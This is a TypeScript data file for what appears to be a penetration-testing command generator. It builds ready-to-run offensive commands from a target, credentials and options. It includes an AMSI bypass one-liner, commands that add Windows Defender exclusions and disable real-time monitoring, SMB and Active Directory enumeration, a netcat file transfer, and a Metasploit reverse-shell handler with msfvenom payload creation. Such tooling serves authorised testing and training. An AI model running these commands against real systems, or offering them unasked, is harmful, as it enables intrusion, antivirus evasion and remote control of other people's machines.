
import { Tool, ToolArg } from '../types';

// --- Helpers ---

const getUrlPrefix = (isHttps: boolean) => isHttps ? 'https://' : 'http://';

const formatTargetWithPort = (target: string) => {
    return target || '$TARGET';
};

// Helper to create arguments easily
const createArg = {
    toggle: (key: string, label: string, defaultValue: boolean = false): ToolArg => ({
        key, type: 'toggle', label, defaultValue
    }),
    input: (key: string, label: string, defaultValue: string = '', placeholder: string = ''): ToolArg => ({
        key, type: 'text', label, defaultValue, placeholder
    })
};

// --- Common Args Definitions ---
const ARG_HTTPS = createArg.toggle('useHttps', 'Use HTTPS', false);
const ARG_OUTPUT = createArg.toggle('saveOutput', 'Save Output', false);
const ARG_CREDS = createArg.toggle('useCreds', 'Credentials', false);

const ARG_WL_DIR = createArg.input('wordlistDir', 'Dir Wordlist', '/usr/share/wordlists/dirb/common.txt');
const ARG_WL_SUB = createArg.input('wordlistSub', 'Subdomain Wordlist', '/usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt');
const ARG_WL_VHOST = createArg.input('wordlistVhost', 'VHost Wordlist', '/usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt');
const ARG_SHARE = createArg.toggle('accessShare', 'Access Share', false);
const ARG_SHARE_NAME = createArg.input('shareName', 'Share Name', '', 'ShareName');


// --- Tools Data ---

export const TOOLS: Tool[] = [
    // --- WINDOWS -> EVASION ---
    {
        id: 'amsi_bypass',
        name: 'AMSI Bypass (Reflection)',
        category: 'WINDOWS',
        subcategory: 'Evasion',
        desc: 'Matt Graeber\'s classic reflection bypass to disable AMSI in the current PowerShell session.',
        authMode: 'none',
        generate: (v, args) => {
            return `[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)`;
        }
    },
    {
        id: 'defender_exclusion',
        name: 'Defender Exclusion (Path)',
        category: 'WINDOWS',
        subcategory: 'Evasion',
        desc: 'Add a folder exclusion to Windows Defender to prevent scanning of tools (Requires Admin).',
        authMode: 'none',
        args: [createArg.input('exclusionPath', 'Path', 'C:\\Temp', 'C:\\Path\\To\\Exclude')],
        generate: (v, args) => {
            return `Add-MpPreference -ExclusionPath "${args.exclusionPath || 'C:\\Temp'}"`;
        }
    },
    {
        id: 'disable_realtime_monitoring',
        name: 'Disable Real-time Monitor',
        category: 'WINDOWS',
        subcategory: 'Evasion',
        desc: 'Disable Windows Defender Real-time Monitoring completely (Requires Admin).',
        authMode: 'none',
        generate: (v, args) => {
            return `Set-MpPreference -DisableRealtimeMonitoring $true`;
        }
    },

    // --- SERVICE (Service Enumeration) -> SMB ---
    {
        id: 'smbclient',
        name: 'smbclient',
        category: 'SERVICE',
        subcategory: 'SMB',
        desc: 'FTP-like client to access SMB/CIFS resources.',
        authMode: 'optional',
        args: [ARG_CREDS, ARG_SHARE, ARG_SHARE_NAME],
        generate: (v, args) => {
            const auth = args.useCreds ? `-U '${v.username || '$USERNAME'}%${v.password || '$PASSWORD'}'` : '-N';
            const command = args.accessShare ? `//${v.target || '$TARGET'}/${args.shareName || '$SHARE'}` : `-L //${v.target || '$TARGET'}/`;
            return `smbclient ${auth} ${command}`;
        }
    },
    {
        id: 'smbmap',
        name: 'smbmap',
        category: 'SERVICE',
        subcategory: 'SMB',
        desc: 'SMB enumeration tool.',
        authMode: 'optional',
        args: [ARG_CREDS, ARG_SHARE, ARG_SHARE_NAME],
        generate: (v, args) => {
            const auth = args.useCreds ? `-u '${v.username || 'user'}' -p '${v.password || 'pass'}'` : `-u 'guest' -p ''`;
            const command = args.accessShare ? `-r ${args.shareName || '$SHARE'} --depth 2` : ``;
            return `smbmap -H ${v.target || '$TARGET'} ${auth} ${command} --no-banner -q`;
        }
    },
    {
        id: 'enum4linux',
        name: 'enum4linux-ng',
        category: 'SERVICE',
        subcategory: 'SMB',
        desc: 'Next-gen version of enum4linux.',
        authMode: 'optional',
        args: [ARG_CREDS],
        generate: (v, args) => {
            const auth = args.useCreds
                ? `-u '${v.username || 'user'}' -p '${v.password || 'pass'}'`
                : '-A';
            return `enum4linux-ng ${auth} ${v.target || '$TARGET'}`;
        }
    },
    {
        id: 'nxc',
        name: 'NetExec (nxc)',
        category: 'SERVICE',
        subcategory: 'SMB',
        desc: 'Network Execution tool (formerly crackmapexec).',
        authMode: 'optional',
        args: [ARG_CREDS],
        generate: (v, args) => {
            const auth = args.useCreds
                ? `-u '${v.username || 'user'}' -p '${v.password || 'pass'}'`
                : '-u "" -p ""';
            return `nxc smb ${v.target || '$TARGET'} ${auth}`;
        }
    },

    {
        id: 'bloodhound',
        name: 'BloodHound (Python)',
        category: 'AD',
        subcategory: 'Bloodhound Ingestion',
        desc: 'Ingestor for BloodHound.',
        authMode: 'required',
        generate: (v, args) => {
            return `bloodhound-ce-python -u '${v.username || 'user'}' -p '${v.password || 'pass'}' -ns ${v.target || '$TARGET'} -d ${v.domain || '$DOMAIN'} -c all`;
        }
    },

    {
        id: 'ssh',
        name: 'SSH',
        category: 'OTHER',
        subcategory: 'Remote Access',
        desc: 'Non-interactive ssh password provider.',
        authMode: 'required',
        generate: (v, args) => {
            return `sshpass -p '${v.password || '$PASSWORD'}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null ${v.username || '$USERNAME'}@${v.target || '$TARGET'}`;
        }
    },
    {
        id: 'ftp',
        name: 'FTP',
        category: 'OTHER',
        subcategory: 'Remote Access',
        desc: 'Sophisticated file transfer program.',
        authMode: 'required',
        generate: (v, args) => {
            return `lftp -u ${v.username || '$ftp_user'},${v.password || '$ftp_pass'} ftp://${v.target || '$TARGET'}`;
        }
    },
    {
        id: 'RDP',
        name: 'RDP',
        category: 'OTHER',
        subcategory: 'Remote Access',
        desc: 'RDP Client.',
        authMode: 'required',
        generate: (v, args) => {
            return `xfreerdp3 /v:${v.target || '$TARGET'} +clipboard /dynamic-resolution /drive:share,$current_dir /u:${v.username || '$USERNAME'} /p:'${v.password || '$PASSWORD'}'`;
        }
    },
    {
        id: 'scp',
        name: 'SCP',
        category: 'OTHER',
        subcategory: 'File Transfer',
        desc: 'Secure copy (remote file copy program).',
        authMode: 'required',
        generate: (v, args) => {
            return `scp -r ${v.filepath || '$FILEPATH'} ${v.username || '$USERNAME'}@${v.target || '$TARGET'}:/home/${v.username || '$DESTINATION'}/`;
        }
    },
    {
        id: 'bash',
        name: 'Bash',
        category: 'OTHER',
        subcategory: 'File Transfer',
        desc: 'Bash built-in file transfer',
        authMode: 'none',
        args: [

        ],
        generate: (v, args) => {
            return `# Sender
nc -lvnp 8000 < ${v.filepath || '$FILEPATH'}

# Receiver
nc -q 0 ${v.target || '$TARGET'} 8000 > ${v.filepath || '$FILEPATH'}`;
        }
    },
    {
        id: 'impacket-smb',
        name: 'Impacket SMB Server',
        category: 'OTHER',
        subcategory: 'File Transfer',
        desc: 'Impacket SMB Server for file sharing.',
        authMode: 'none',
        generate: (v, args) => {
            return `sudo impacket-smbserver share -smb2support .`;
        }
    },
    {
        id: 'nmap',
        name: 'Nmap',
        category: 'SERVICE',
        subcategory: 'Port Scanning',
        desc: 'Network exploration and security auditing.',
        authMode: 'none',
        args: [
            createArg.toggle('udp', 'UDP Scan (-sU)', false),
        ],
        generate: (v, args) => {
            const proto = args.udp ? '-sU --top-ports 100' : '';
            return `nmap ${proto} -sV -sC -Pn ${v.target || '$TARGET'}`;
        }
    },
    {
        id: 'rustscan',
        name: 'RustScan',
        category: 'SERVICE',
        subcategory: 'Port Scanning',
        desc: 'Faster Nmap scanner.',
        authMode: 'none',
        generate: (v, args) => {
            return `rustscan -a ${v.target || '$TARGET'} --ulimit 5000 --no-banner`;
        }
    },

    {
        id: 'handler',
        name: 'Handler',
        category: 'EXPLOIT',
        subcategory: 'Metasploit',
        desc: 'Quick Metasploit listener setup.',
        authMode: 'none',
        args: [
            createArg.input('lhost', 'LHOST', '', 'tun0 IP'),
            createArg.input('lport', 'LPORT', '4444', '4444'),
            createArg.input('payload', 'Payload', 'windows/x64/meterpreter/reverse_tcp', 'Payload')
        ],
        generate: (v, args) => {
            const lhost = args.lhost || '$LHOST';
            const lport = args.lport || '$LPORT';
            return `msfconsole -q -x "use exploit/multi/handler; set payload ${args.payload || '$PAYLOAD'}; set LHOST ${lhost}; set LPORT ${lport}; run"`;
        }
    },

    {
        id: 'msfvenom',
        name: 'Msfvenom',
        category: 'EXPLOIT',
        subcategory: 'Metasploit',
        desc: 'Quick Msfvenom payload generation.',
        authMode: 'none',
        args: [
            createArg.input('lhost', 'LHOST', '', 'tun0 IP'),
            createArg.input('lport', 'LPORT', '4444', '4444'),
            createArg.input('payload', 'Payload', 'windows/x64/meterpreter/reverse_tcp', 'Payload')
        ],
        generate: (v, args) => {
            const lhost = args.lhost || '$LHOST';
            const lport = args.lport || '$LPORT';
            return `msfvenom -p ${args.payload || '$PAYLOAD'} LHOST=${lhost} LPORT=${lport} -f exe -o payload.exe`;
        }
    },

    {
        id: 'subfinder',
        name: 'Subfinder',
        category: 'WEB',
        subcategory: 'Subdomain Enum',
        desc: 'Subdomain discovery tool.',
        authMode: 'none',
        args: [ARG_OUTPUT],
        generate: (v, args) => {
            let cmd = `subfinder -d ${v.target || '$TARGET'}`;
            if (args.saveOutput) cmd += ` -o subfinder_output.txt`;
            return cmd;
        }
    },
    {
        id: 'gobuster_dns',
        name: 'Gobuster (DNS)',
        category: 'WEB',
        subcategory: 'Subdomain Enum',
        desc: 'DNS subdomain brute-forcing.',
        authMode: 'none',
        args: [ARG_WL_SUB],
        generate: (v, args) => {
            return `gobuster dns -d ${v.target || '$TARGET'} -w ${args.wordlistSub || '$WORDLIST_SUBDOMAIN'}`;
        }
    },
    {
        id: 'dnsrecon',
        name: 'DNSRecon',
        category: 'WEB',
        subcategory: 'Subdomain Enum',
        desc: 'DNS enumeration script.',
        authMode: 'none',
        args: [ARG_WL_SUB],
        generate: (v, args) => {
            return `dnsrecon -d ${v.target || '$TARGET'} -t brf -w ${args.wordlistSub || '$WORDLIST_SUBDOMAIN'} -f -n 8.8.8.8`;
        }
    },
    {
        id: 'gobuster_vhost',
        name: 'Gobuster (VHost)',
        category: 'WEB',
        subcategory: 'VHost Discovery',
        desc: 'Virtual host brute-forcing.',
        authMode: 'none',
        args: [ARG_HTTPS, ARG_WL_VHOST],
        generate: (v, args) => {
            const prefix = getUrlPrefix(args.useHttps);
            const targetWithPort = formatTargetWithPort(v.target);
            return `gobuster vhost -u ${prefix}${targetWithPort} -w ${args.wordlistVhost || '$WORDLIST_VHOST'} --append-domain`;
        }
    },
    {
        id: 'ffuf_vhost',
        name: 'FFUF (VHost)',
        category: 'WEB',
        subcategory: 'VHost Discovery',
        desc: 'Fast web fuzzer for VHosts.',
        authMode: 'none',
        args: [ARG_HTTPS, ARG_OUTPUT, ARG_WL_VHOST],
        generate: (v, args) => {
            const prefix = getUrlPrefix(args.useHttps);
            const targetWithPort = formatTargetWithPort(v.target);
            let cmd = `ffuf -u ${prefix}${targetWithPort} -H 'Host:FUZZ.${v.target || '$TARGET'}' -w ${args.wordlistVhost || '$WORDLIST_VHOST'} -ic`;
            if (args.saveOutput) cmd += ` -o ffuf_vhost.txt`;
            return cmd;
        }
    },
    {
        id: 'ffuf_dir',
        name: 'FFUF (Directory)',
        category: 'WEB',
        subcategory: 'Directory Fuzzing',
        desc: 'Fast web fuzzer for directories.',
        authMode: 'none',
        args: [ARG_HTTPS, ARG_WL_DIR],
        generate: (v, args) => {
            const prefix = getUrlPrefix(args.useHttps);
            const targetWithPort = formatTargetWithPort(v.target);
            return `ffuf -u ${prefix}${targetWithPort}/FUZZ -w ${args.wordlistDir || '$WORDLIST_DIR'} -ic`;
        }
    },
    {
        id: 'feroxbuster',
        name: 'Feroxbuster',
        category: 'WEB',
        subcategory: 'Directory Fuzzing',
        desc: 'Simple, fast, recursive content discovery.',
        authMode: 'none',
        args: [ARG_HTTPS],
        generate: (v, args) => {
            const prefix = getUrlPrefix(args.useHttps);
            const targetWithPort = formatTargetWithPort(v.target);
            return `feroxbuster -u ${prefix}${targetWithPort}`;
        }
    },
    {
        id: 'httpx',
        name: 'Httpx',
        category: 'WEB',
        subcategory: 'Fingerprinting',
        desc: 'HTTP toolkit for single target.',
        authMode: 'none',
        args: [ARG_OUTPUT],
        generate: (v, args) => {
            let cmd = `httpx -list -status-code -title -no-fallback ${v.filepath || '$FILEPATH'}`;
            if (args.saveOutput) cmd += ` -o httpx.txt`;
            return cmd;
        }
    },
    {
        id: 'gowitness',
        name: 'Gowitness',
        category: 'WEB',
        subcategory: 'Fingerprinting',
        desc: 'Screenshot utility_FILE.',
        authMode: 'none',
        args: [],
        generate: (v, args) => {
            return `cat ${v.filepath || '$FILEPATH'} | gowitness scan file -f - --write-db && gowitness report server --db-uri sqlite://gowitness.sqlite3 --screenshot-path ./screenshots --port 7171`;
        }
    },
    {
        id: 'whatweb',
        name: 'WhatWeb',
        category: 'WEB',
        subcategory: 'Fingerprinting',
        desc: 'Web scanner.',
        authMode: 'none',
        args: [ARG_HTTPS],
        generate: (v, args) => {
            const prefix = getUrlPrefix(args.useHttps);
            const targetWithPort = formatTargetWithPort(v.target);
            return `whatweb ${prefix}${targetWithPort}`;
        }
    },
    {
        id: 'nuclei',
        name: 'Nuclei',
        category: 'WEB',
        subcategory: 'Fingerprinting',
        desc: 'Vulnerability scanner.',
        authMode: 'none',
        args: [ARG_HTTPS, ARG_OUTPUT],
        generate: (v, args) => {
            const prefix = getUrlPrefix(args.useHttps);
            const targetWithPort = formatTargetWithPort(v.target);
            let cmd = `nuclei -u ${prefix}${targetWithPort}`;
            if (args.saveOutput) cmd += ` -o nuclei_vulns.txt`;
            return cmd;
        }
    },
];
